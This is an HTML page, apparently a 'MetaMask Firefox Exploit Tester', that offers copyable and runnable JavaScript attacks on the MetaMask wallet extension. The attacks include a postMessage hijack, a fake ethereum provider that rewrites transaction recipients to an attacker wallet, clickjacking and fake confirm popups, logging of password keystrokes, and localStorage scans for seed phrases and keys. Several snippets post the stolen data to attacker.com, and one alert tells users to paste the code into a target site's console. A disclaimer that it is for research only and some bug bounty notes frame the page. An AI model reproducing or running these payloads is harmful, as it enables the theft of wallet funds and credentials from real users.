<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>üîì MetaMask Firefox Exploit Tester</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: #0a0a0a;
            color: #0f0;
            font-family: 'Courier New', monospace;
            padding: 20px;
            line-height: 1.6;
        }
        
        .container {
            max-width: 1000px;
            margin: 0 auto;
        }
        
        .header {
            text-align: center;
            padding: 20px;
            border-bottom: 2px solid #0f0;
            margin-bottom: 30px;
        }
        
        h1 {
            color: #ff6600;
            font-size: 2.2em;
            margin-bottom: 10px;
            text-shadow: 0 0 10px #ff6600;
        }
        
        .warning {
            background: rgba(255, 0, 0, 0.2);
            border: 2px solid #f00;
            padding: 15px;
            margin: 20px 0;
            border-radius: 5px;
            text-align: center;
        }
        
        .tab-container {
            display: flex;
            margin-bottom: 20px;
            border-bottom: 1px solid #333;
        }
        
        .tab {
            padding: 12px 25px;
            background: #222;
            border: 1px solid #333;
            border-bottom: none;
            cursor: pointer;
            margin-right: 5px;
            transition: all 0.3s;
        }
        
        .tab.active {
            background: #0a0a0a;
            border-color: #0f0;
            color: #0f0;
        }
        
        .tab-content {
            display: none;
            padding: 25px;
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid #333;
            border-radius: 0 5px 5px 5px;
            min-height: 400px;
        }
        
        .tab-content.active {
            display: block;
        }
        
        .exploit-box {
            background: rgba(255, 0, 0, 0.1);
            border: 1px solid #f00;
            padding: 20px;
            margin: 20px 0;
            border-radius: 5px;
        }
        
        .exploit-title {
            color: #f00;
            font-size: 1.3em;
            margin-bottom: 10px;
        }
        
        code {
            display: block;
            background: #000;
            padding: 15px;
            margin: 10px 0;
            border-left: 3px solid #0f0;
            overflow-x: auto;
            font-size: 14px;
            white-space: pre-wrap;
        }
        
        .button {
            display: inline-block;
            padding: 12px 25px;
            background: #ff6600;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-family: inherit;
            font-weight: bold;
            margin: 10px 5px;
            transition: 0.3s;
            text-decoration: none;
        }
        
        .button:hover {
            background: #ff8800;
            transform: scale(1.05);
        }
        
        .button-danger {
            background: #f00;
        }
        
        .button-danger:hover {
            background: #ff3333;
        }
        
        .result-box {
            background: rgba(0, 255, 0, 0.1);
            border: 1px solid #0f0;
            padding: 15px;
            margin: 20px 0;
            border-radius: 5px;
            display: none;
        }
        
        .status {
            padding: 8px 15px;
            border-radius: 20px;
            font-weight: bold;
            margin: 5px;
            display: inline-block;
        }
        
        .vulnerable {
            background: #f00;
            color: white;
        }
        
        .patched {
            background: #0f0;
            color: black;
        }
        
        .test-section {
            margin: 25px 0;
            padding: 20px;
            background: rgba(255, 255, 255, 0.05);
            border-radius: 5px;
        }
        
        h3 {
            color: #00aaff;
            margin-bottom: 15px;
            border-bottom: 1px solid #00aaff;
            padding-bottom: 5px;
        }
        
        .description {
            color: #aaa;
            margin-bottom: 15px;
            font-size: 0.95em;
        }
        
        .firefox-specific {
            background: rgba(255, 140, 0, 0.1);
            border-left: 4px solid #ff8c00;
            padding: 15px;
            margin: 15px 0;
        }
        
        .important-note {
            background: rgba(255, 215, 0, 0.1);
            border: 2px solid gold;
            padding: 20px;
            margin: 30px 0;
            border-radius: 5px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>üîì Firefox MetaMask Exploit Tester</h1>
            <p>0-Click & 1-Click Attack Vectors Against MetaMask Extension</p>
        </div>
        
        <div class="warning">
            ‚ö†Ô∏è <strong>FOR SECURITY RESEARCH ONLY</strong> - Use only on your own wallets<br>
            Testing real user wallets without permission is ILLEGAL
        </div>
        
        <div class="tab-container">
            <div class="tab active" onclick="switchTab('injection')">üíâ DOM Injection</div>
            <div class="tab" onclick="switchTab('postmessage')">üì® PostMessage</div>
            <div class="tab" onclick="switchTab('ui')">üé≠ UI Redressing</div>
            <div class="tab" onclick="switchTab('firefox')">ü¶ä Firefox Specific</div>
            <div class="tab" onclick="switchTab('storage')">üíæ Storage Attacks</div>
        </div>
        
        <!-- TAB 1: DOM INJECTION -->
        <div id="injection" class="tab-content active">
            <h3>üíâ DOM Injection Attacks</h3>
            <p class="description">Inject malicious code into pages that MetaMask interacts with</p>
            
            <div class="exploit-box">
                <div class="exploit-title">üî¥ 0-Click: Content Script Hijacking</div>
                <p>MetaMask content scripts run in page context. Can we intercept them?</p>
                
                <code id="code1">
// Firefox: Override functions before MetaMask loads
(function() {
    // Hook XMLHttpRequest before MetaMask
    const originalXHROpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(method, url, async, user, password) {
        console.log('üì® XHR intercepted:', url);
        // Can modify responses to MetaMask
        return originalXHROpen.apply(this, arguments);
    };
    
    // Hook fetch API
    const originalFetch = window.fetch;
    window.fetch = function(...args) {
        console.log('üé£ Fetch intercepted:', args[0]);
        return originalFetch.apply(this, args);
    };
    
    // Hook EventTarget.addEventListener
    const originalAddEventListener = EventTarget.prototype.addEventListener;
    EventTarget.prototype.addEventListener = function(type, listener, options) {
        console.log('üéØ Event listener added:', type);
        // Can modify or block MetaMask event handlers
        return originalAddEventListener.call(this, type, listener, options);
    };
})();
                </code>
                <button class="button" onclick="copyCode(1)">Copy Exploit</button>
                <button class="button button-danger" onclick="runInjectionTest()">Run Test</button>
            </div>
            
            <div class="exploit-box">
                <div class="exploit-title">üî¥ 1-Click: Iframe Sandbox Escape</div>
                <p>Attempt to break out of iframe sandbox to access parent window</p>
                
                <code id="code2">
// Create malicious iframe that tries to access parent
const maliciousIframe = document.createElement('iframe');
maliciousIframe.srcdoc = `
&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;script&gt;
    try {
        // Try to access parent window
        const parentWindow = window.parent;
        
        // Try to find MetaMask provider
        if (parentWindow.ethereum) {
            console.log('üéØ MetaMask found in parent!');
            
            // Try to request accounts
            parentWindow.ethereum.request({ method: 'eth_accounts' })
                .then(accounts => {
                    console.log('üí∞ Accounts accessed:', accounts);
                    // Send to attacker server
                    fetch('https://attacker.com/steal?accounts=' + encodeURIComponent(JSON.stringify(accounts)));
                });
        }
        
        // Try to access parent localStorage
        console.log('Attempting localStorage access...');
        
    } catch (e) {
        console.log('Iframe sandbox prevented access:', e.message);
    }
&lt;/script&gt;
&lt;/html&gt;
`;

// Set sandbox attributes - try to bypass
maliciousIframe.sandbox = 'allow-scripts allow-same-origin';
maliciousIframe.style.display = 'none';
document.body.appendChild(maliciousIframe);

console.log('‚ö†Ô∏è Malicious iframe injected');
                </code>
                <button class="button" onclick="copyCode(2)">Copy Exploit</button>
                <button class="button button-danger" onclick="runIframeTest()">Run Test</button>
            </div>
        </div>
        
        <!-- TAB 2: POSTMESSAGE ATTACKS -->
        <div id="postmessage" class="tab-content">
            <h3>üì® PostMessage Vulnerability Testing</h3>
            <p class="description">MetaMask uses postMessage for communication. Can we intercept or inject?</p>
            
            <div class="exploit-box">
                <div class="exploit-title">üî¥ 0-Click: PostMessage Listener Hijack</div>
                
                <code id="code3">
// Listen for ALL postMessage events
window.addEventListener('message', (event) => {
    console.log('üì® ALL Messages intercepted:', event.data);
    
    // Check if it's MetaMask related
    if (event.data && event.data.type) {
        console.log('üéØ MetaMask message type:', event.data.type);
        
        // Can modify or block messages
        if (event.data.type === 'ETH_ACCOUNTS_RESPONSE') {
            console.log('üí∞ Accounts response intercepted!');
            // Could modify accounts array here
        }
        
        // Send to attacker
        fetch('https://attacker.com/log', {
            method: 'POST',
            body: JSON.stringify(event.data)
        });
    }
}, true); // Use capture phase to get messages first

// Also hook window.postMessage
const originalPostMessage = window.postMessage;
window.postMessage = function(message, targetOrigin, transfer) {
    console.log('üì§ Outgoing message:', message);
    
    // Modify messages going TO MetaMask
    if (message && message.type === 'ETH_REQUEST') {
        console.log('‚ö†Ô∏è Modifying MetaMask request');
        // Could change transaction details
    }
    
    return originalPostMessage.call(this, message, targetOrigin, transfer);
};

console.log('üéØ PostMessage hijack active');
                </code>
                <button class="button" onclick="copyCode(3)">Copy Exploit</button>
                <button class="button button-danger" onclick="runPostMessageTest()">Run Test</button>
            </div>
            
            <div class="exploit-box">
                <div class="exploit-title">üî¥ 1-Click: Fake MetaMask Provider via PostMessage</div>
                
                <code id="code4">
// Create fake window.ethereum that uses postMessage
const fakeEthereum = {
    isMetaMask: true,
    isConnected: () => true,
    request: async (request) => {
        console.log('üé£ Fake provider request:', request);
        
        // Intercept specific requests
        if (request.method === 'eth_sendTransaction') {
            console.log('üí∞ SEND TRANSACTION INTERCEPTED!');
            console.log('Original TX:', request.params[0]);
            
            // Modify transaction
            const modifiedTx = {
                ...request.params[0],
                to: '0xATTACKER_WALLET', // Change recipient
                value: '0x' + (parseInt(request.params[0].value || '0x0', 16) * 2).toString(16) // Double amount
            };
            
            console.log('Modified TX:', modifiedTx);
            
            // Could forward to real MetaMask or just steal
            alert('üö® Transaction would be modified! Check console.');
            return null;
        }
        
        // For other methods, try to use real provider
        if (window.realEthereum) {
            return window.realEthereum.request(request);
        }
        
        return null;
    },
    on: (event, handler) => {
        console.log('Fake event listener:', event);
    }
};

// Replace window.ethereum
window.realEthereum = window.ethereum;
window.ethereum = fakeEthereum;

console.log('‚úÖ Fake Ethereum provider injected');
console.log('All wallet interactions now go through our malicious provider');
                </code>
                <button class="button" onclick="copyCode(4)">Copy Exploit</button>
                <button class="button button-danger" onclick="runFakeProviderTest()">Run Test</button>
            </div>
        </div>
        
        <!-- TAB 3: UI REDRESSING -->
        <div id="ui" class="tab-content">
            <h3>üé≠ UI Redressing & Clickjacking</h3>
            <p class="description">Trick users into clicking MetaMask UI elements they didn't intend to</p>
            
            <div class="exploit-box">
                <div class="exploit-title">üî¥ 0-Click: Overlay Attack</div>
                
                <code id="code5">
// Create invisible overlay that captures clicks
const overlay = document.createElement('div');
overlay.style.cssText = `
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: transparent;
    z-index: 999999;
    cursor: pointer;
`;

// When user clicks anywhere, trigger MetaMask popup
overlay.onclick = async () => {
    console.log('üéØ Overlay clicked!');
    
    if (window.ethereum) {
        try {
            // Request accounts - shows MetaMask popup
            const accounts = await window.ethereum.request({
                method: 'eth_requestAccounts'
            });
            console.log('üí∞ Got accounts:', accounts);
            
            // Then try to send transaction
            const tx = {
                from: accounts[0],
                to: '0xATTACKER_WALLET',
                value: '0x' + (10 ** 18).toString(16) // 1 ETH
            };
            
            console.log('Attempting malicious transaction...');
            
        } catch (error) {
            console.log('Error:', error.message);
        }
    }
};

// Add to page
document.body.appendChild(overlay);

console.log('‚ö†Ô∏è Transparent overlay active');
console.log('User clicks ANYWHERE will trigger wallet connection');
                </code>
                <button class="button" onclick="copyCode(5)">Copy Exploit</button>
                <button class="button button-danger" onclick="runOverlayTest()">Run Test</button>
            </div>
            
            <div class="exploit-box">
                <div class="exploit-title">üî¥ 1-Click: Fake MetaMask Popup</div>
                
                <code id="code6">
// Create fake MetaMask popup
function createFakeMetaMaskPopup() {
    const popup = document.createElement('div');
    popup.style.cssText = `
        position: fixed;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
        width: 400px;
        background: #24272a;
        color: white;
        border-radius: 12px;
        z-index: 1000000;
        font-family: -apple-system, BlinkMacSystemFont, sans-serif;
        box-shadow: 0 10px 40px rgba(0,0,0,0.5);
        overflow: hidden;
    `;
    
    popup.innerHTML = \`
        <div style="background: #037dd6; padding: 20px; text-align: center;">
            <div style="font-size: 24px; font-weight: bold;">ü¶ä MetaMask</div>
            <div style="font-size: 14px; opacity: 0.9;">Confirm Transaction</div>
        </div>
        
        <div style="padding: 25px;">
            <div style="margin-bottom: 20px;">
                <div style="color: #8a939e; font-size: 14px; margin-bottom: 5px;">From</div>
                <div style="font-family: monospace; background: #141619; padding: 10px; border-radius: 5px;">
                    0x1234...5678
                </div>
            </div>
            
            <div style="margin-bottom: 20px;">
                <div style="color: #8a939e; font-size: 14px; margin-bottom: 5px;">To</div>
                <div style="font-family: monospace; background: #141619; padding: 10px; border-radius: 5px;">
                    0xYOUR_WALLET_HERE
                </div>
            </div>
            
            <div style="margin-bottom: 20px;">
                <div style="color: #8a939e; font-size: 14px; margin-bottom: 5px;">Amount</div>
                <div style="font-size: 24px; font-weight: bold;">1.5 ETH</div>
            </div>
            
            <div style="display: flex; gap: 10px;">
                <button id="fakeReject" style="flex: 1; padding: 15px; background: #3a3f47; border: none; border-radius: 100px; color: white; cursor: pointer;">
                    Reject
                </button>
                <button id="fakeConfirm" style="flex: 1; padding: 15px; background: #037dd6; border: none; border-radius: 100px; color: white; font-weight: bold; cursor: pointer;">
                    Confirm
                </button>
            </div>
        </div>
        
        <div style="padding: 15px 25px; background: #141619; font-size: 12px; color: #8a939e; text-align: center;">
            Only trust this window if you opened it. Check the URL.
        </div>
    \`;
    
    document.body.appendChild(popup);
    
    // Button handlers
    document.getElementById('fakeReject').onclick = () => {
        document.body.removeChild(popup);
        console.log('User rejected fake popup');
    };
    
    document.getElementById('fakeConfirm').onclick = async () => {
        console.log('üö® User confirmed FAKE transaction!');
        
        // Now show real MetaMask popup with different details
        if (window.ethereum) {
            try {
                const accounts = await window.ethereum.request({
                    method: 'eth_requestAccounts'
                });
                
                // Real transaction - different from what user saw
                const realTx = {
                    from: accounts[0],
                    to: '0xATTACKER_WALLET',
                    value: '0x' + (15 ** 18).toString(16) // 15 ETH instead of 1.5
                };
                
                console.log('Attempting real transaction:', realTx);
                
            } catch (error) {
                console.log('Error:', error);
            }
        }
        
        document.body.removeChild(popup);
    };
    
    console.log('üé≠ Fake MetaMask popup created');
}

// Trigger after user interaction
document.addEventListener('click', createFakeMetaMaskPopup, { once: true });
                </code>
                <button class="button" onclick="copyCode(6)">Copy Exploit</button>
                <button class="button button-danger" onclick="runFakePopupTest()">Run Test</button>
            </div>
        </div>
        
        <!-- TAB 4: FIREFOX SPECIFIC -->
        <div id="firefox" class="tab-content">
            <h3>ü¶ä Firefox-Specific Exploits</h3>
            <p class="description">Firefox has different extension APIs and security model than Chrome</p>
            
            <div class="firefox-specific">
                <p><strong>Firefox Extension Architecture Differences:</strong></p>
                <ul>
                    <li>WebExtensions API (similar to Chrome but with differences)</li>
                    <li>Different content script injection timing</li>
                    <li>Different permission model</li>
                    <li>Different storage access patterns</li>
                </ul>
            </div>
            
            <div class="exploit-box">
                <div class="exploit-title">üî¥ Firefox: Extension Storage Access</div>
                
                <code id="code7">
// Firefox may allow different storage access patterns
async function testFirefoxStorage() {
    // Try to access extension storage via known paths
    const extensionPaths = [
        'moz-extension://*/',
        'resource://*/',
        'chrome://*/'
    ];
    
    for (const path of extensionPaths) {
        try {
            const test = await fetch(path + '_metadata/verified_contents.json');
            if (test.ok) {
                console.log('‚úÖ Extension resource accessible:', path);
                
                // Try to find MetaMask specific files
                const files = [
                    'js/inpage.js',
                    'js/contentscript.js',
                    'manifest.json'
                ];
                
                for (const file of files) {
                    try {
                        const content = await fetch(path + file);
                        console.log(\`üìÑ \${file}: \${content.status}\`);
                    } catch (e) {}
                }
            }
        } catch (error) {
            // Expected - resources not accessible
        }
    }
    
    // Try to detect MetaMask via browser API
    if (typeof browser !== 'undefined') {
        console.log('üåê Firefox browser API available');
        
        // Try to message extension directly
        try {
            browser.runtime.sendMessage('webextension@metamask.io', { type: 'ping' })
                .then(response => {
                    console.log('üéØ MetaMask extension responded!', response);
                })
                .catch(error => {
                    console.log('MetaMask not found or no response');
                });
        } catch (e) {
            console.log('Cannot message extension directly');
        }
    }
}

testFirefoxStorage();
                </code>
                <button class="button" onclick="copyCode(7)">Copy Exploit</button>
                <button class="button button-danger" onclick="runFirefoxStorageTest()">Run Test</button>
            </div>
            
            <div class="exploit-box">
                <div class="exploit-title">üî¥ Firefox: Privileged API Abuse</div>
                
                <code id="code8">
// Firefox privileged APIs that extensions might use
function testPrivilegedAPIs() {
    // Check for privileged APIs
    const privilegedAPIs = [
        'Components',
        'ChromeUtils',
        'XPCOM',
        'Services'
    ];
    
    privilegedAPIs.forEach(api => {
        if (window[api]) {
            console.log(\`‚ö†Ô∏è Privileged API accessible: \${api}\`);
        }
    });
    
    // Try to access clipboard (needs permission but might be granted)
    document.addEventListener('copy', (e) => {
        console.log('üìã Copy event intercepted');
        // Could read clipboard data
    });
    
    document.addEventListener('paste', (e) => {
        console.log('üìã Paste event intercepted');
        // Could read pasted data (like private keys)
    });
    
    // Listen for all keyboard events (keylogging)
    document.addEventListener('keydown', (e) => {
        // Don't log everything, just sensitive keys
        if (e.target.type === 'password' || e.target.getAttribute('type') === 'password') {
            console.log('‚å®Ô∏è Password field keypress:', e.key);
        }
    }, true);
    
    console.log('üéØ Privileged API test active');
}

testPrivilegedAPIs();
                </code>
                <button class="button" onclick="copyCode(8)">Copy Exploit</button>
                <button class="button button-danger" onclick="runPrivilegedAPITest()">Run Test</button>
            </div>
        </div>
        
        <!-- TAB 5: STORAGE ATTACKS -->
        <div id="storage" class="tab-content">
            <h3>üíæ Local Storage & Data Attacks</h3>
            <p class="description">MetaMask stores sensitive data. Can we access or modify it?</p>
            
            <div class="exploit-box">
                <div class="exploit-title">üî¥ 0-Click: localStorage Data Theft</div>
                
                <code id="code9">
// Scan localStorage for sensitive data
function stealLocalStorage() {
    const stolenData = {};
    
    // Check all localStorage items
    for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        const value = localStorage.getItem(key);
        
        // Look for sensitive keys
        const sensitivePatterns = [
            /wallet/i,
            /account/i,
            /address/i,
            /private/i,
            /key/i,
            /seed/i,
            /mnemonic/i,
            /phrase/i,
            /password/i,
            /token/i,
            /auth/i,
            /session/i
        ];
        
        let isSensitive = false;
        sensitivePatterns.forEach(pattern => {
            if (pattern.test(key) || pattern.test(value)) {
                isSensitive = true;
            }
        });
        
        if (isSensitive) {
            stolenData[key] = value;
            console.log(\`üîì Sensitive data found: \${key} = \${value.substring(0, 50)}...\`);
        }
    }
    
    // Send to attacker
    if (Object.keys(stolenData).length > 0) {
        console.log('üí∞ Stolen data:', stolenData);
        
        // Simulate sending to attacker
        fetch('https://attacker.com/steal', {
            method: 'POST',
            body: JSON.stringify(stolenData)
        }).then(() => {
            console.log('üì§ Data sent to attacker');
        });
    }
    
    return stolenData;
}

// Run immediately
const stolen = stealLocalStorage();
console.log(\`üéØ Stolen \${Object.keys(stolen).length} sensitive items\`);
                </code>
                <button class="button" onclick="copyCode(9)">Copy Exploit</button>
                <button class="button button-danger" onclick="runStorageTheftTest()">Run Test</button>
            </div>
            
            <div class="exploit-box">
                <div class="exploit-title">üî¥ 1-Click: Data Corruption Attack</div>
                
                <code id="code10">
// Corrupt or manipulate MetaMask's storage
function corruptMetaMaskData() {
    // Find MetaMask's storage keys
    const metamaskKeys = [];
    
    for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        if (key.includes('metamask') || key.includes('MetaMask') || key.includes('MM')) {
            metamaskKeys.push(key);
        }
    }
    
    console.log('üîç Found MetaMask keys:', metamaskKeys);
    
    // Corrupt data (example)
    metamaskKeys.forEach(key => {
        try {
            const original = localStorage.getItem(key);
            const corrupted = 'CORRUPTED_' + original;
            localStorage.setItem(key, corrupted);
            console.log(\`‚ö†Ô∏è Corrupted: \${key}\`);
        } catch (e) {
            console.log(\`Cannot corrupt \${key}: \`, e.message);
        }
    });
    
    // Alternative: Add malicious data
    localStorage.setItem('metamask-malicious-settings', JSON.stringify({
        phishingDetection: false,
        autoApprove: true,
        defaultGasPrice: '0x0'
    }));
    
    console.log('‚úÖ MetaMask data corrupted/malicious settings added');
}

// Execute on user interaction
document.body.onclick = () => {
    corruptMetaMaskData();
    alert('üö® MetaMask data corrupted!');
};
                </code>
                <button class="button" onclick="copyCode(10)">Copy Exploit</button>
                <button class="button button-danger" onclick="runCorruptionTest()">Run Test</button>
            </div>
        </div>
        
        <div class="result-box" id="resultBox">
            <strong>üìä TEST RESULTS:</strong><br>
            <div id="results"></div>
        </div>
        
        <div class="important-note">
            <strong>‚ö†Ô∏è IMPORTANT FOR BUG BOUNTY:</strong>
            <p>1. Test only on your own MetaMask installation</p>
            <p>2. Document everything with screenshots/video</p>
            <p>3. Report responsibly through Immunefi or official channels</p>
            <p>4. Firefox may have different vulnerabilities than Chrome</p>
            <p>5. Check if MetaMask is running in Private Browsing mode (different storage)</p>
        </div>
        
        <!-- QUICK TEST BUTTON -->
        <div style="text-align: center; margin: 30px 0;">
            <button class="button" style="font-size: 18px; padding: 15px 30px;" onclick="runAllTests()">
                üöÄ RUN COMPREHENSIVE TEST SUITE
            </button>
        </div>
    </div>

    <script>
        // Tab switching
        function switchTab(tabName) {
            // Hide all tabs
            document.querySelectorAll('.tab-content').forEach(tab => {
                tab.classList.remove('active');
            });
            
            // Remove active from all tab buttons
            document.querySelectorAll('.tab').forEach(tab => {
                tab.classList.remove('active');
            });
            
            // Show selected tab
            document.getElementById(tabName).classList.add('active');
            
            // Activate tab button
            event.target.classList.add('active');
        }
        
        // Copy code functions
        function copyCode(codeNum) {
            const code = document.getElementById('code' + codeNum).textContent;
            navigator.clipboard.writeText(code).then(() => {
                alert(`‚úÖ Exploit code ${codeNum} copied!\n\nPaste in Console of target website (F12)`);
            });
        }
        
        // Test execution functions
        function runInjectionTest() {
            try {
                eval(document.getElementById('code1').textContent);
                showResult('üíâ DOM Injection test running. Check console.');
            } catch (error) {
                showResult('‚ùå Error: ' + error.message, 'error');
            }
        }
        
        function runIframeTest() {
            try {
                eval(document.getElementById('code2').textContent);
                showResult('üé≠ Iframe sandbox test running.');
            } catch (error) {
                showResult('‚ùå Error: ' + error.message, 'error');
            }
        }
        
        function runPostMessageTest() {
            try {
                eval(document.getElementById('code3').textContent);
                showResult('üì® PostMessage hijack active.');
            } catch (error) {
                showResult('‚ùå Error: ' + error.message, 'error');
            }
        }
        
        function runFakeProviderTest() {
            try {
                eval(document.getElementById('code4').textContent);
                showResult('üé£ Fake provider injected.');
            } catch (error) {
                showResult('‚ùå Error: ' + error.message, 'error');
            }
        }
        
        function runOverlayTest() {
            try {
                eval(document.getElementById('code5').textContent);
                showResult('üëÅÔ∏è Transparent overlay active.');
            } catch (error) {
                showResult('‚ùå Error: ' + error.message, 'error');
            }
        }
        
        function runFakePopupTest() {
            try {
                eval(document.getElementById('code6').textContent);
                showResult('üé≠ Fake popup will show on next click.');
            } catch (error) {
                showResult('‚ùå Error: ' + error.message, 'error');
            }
        }
        
        function runFirefoxStorageTest() {
            try {
                eval(document.getElementById('code7').textContent);
                showResult('ü¶ä Firefox storage test running.');
            } catch (error) {
                showResult('‚ùå Error: ' + error.message, 'error');
            }
        }
        
        function runPrivilegedAPITest() {
            try {
                eval(document.getElementById('code8').textContent);
                showResult('üîì Privileged API test running.');
            } catch (error) {
                showResult('‚ùå Error: ' + error.message, 'error');
            }
        }
        
        function runStorageTheftTest() {
            try {
                eval(document.getElementById('code9').textContent);
                showResult('üíæ Storage theft test running.');
            } catch (error) {
                showResult('‚ùå Error: ' + error.message, 'error');
            }
        }
        
        function runCorruptionTest() {
            try {
                eval(document.getElementById('code10').textContent);
                showResult('‚ö†Ô∏è Data corruption test ready (click page).');
            } catch (error) {
                showResult('‚ùå Error: ' + error.message, 'error');
            }
        }
        
        function runAllTests() {
            showResult('üöÄ Running comprehensive test suite...');
            
            const tests = [
                runInjectionTest,
                runPostMessageTest,
                runStorageTheftTest
            ];
            
            tests.forEach((test, index) => {
                setTimeout(() => {
                    try {
                        test();
                    } catch (e) {
                        console.error('Test failed:', e);
                    }
                }, index * 2000);
            });
            
            setTimeout(() => {
                showResult('‚úÖ All tests completed. Check console for details.');
            }, tests.length * 2000 + 1000);
        }
        
        function showResult(message, type = 'info') {
            const resultBox = document.getElementById('resultBox');
            const resultsDiv = document.getElementById('results');
            
            resultBox.style.display = 'block';
            
            const time = new Date().toLocaleTimeString();
            const entry = document.createElement('div');
            entry.innerHTML = `[${time}] ${message}`;
            entry.style.color = type === 'error' ? '#ff3333' : '#00ff00';
            entry.style.margin = '5px 0';
            
            resultsDiv.appendChild(entry);
            resultBox.scrollTop = resultBox.scrollHeight;
        }
        
        // Initialize
        console.log('%cüîì MetaMask Firefox Exploit Tester Loaded', 'color: #ff6600; font-size: 18px; font-weight: bold;');
        console.log('%cUse responsibly for security research only!', 'color: #ff0000;');
        
        // Check if we're in Firefox
        if (navigator.userAgent.includes('Firefox')) {
            console.log('ü¶ä Firefox detected');
        } else {
            console.log('‚ö†Ô∏è Not Firefox - some exploits may not work');
        }
        
        // Check for MetaMask
        if (typeof window.ethereum !== 'undefined') {
            console.log('‚úÖ MetaMask detected');
            if (window.ethereum.isMetaMask) {
                console.log('‚úÖ Confirmed as MetaMask');
            }
        } else {
            console.log('‚ùå MetaMask not detected');
        }
    </script>
</body>
</html>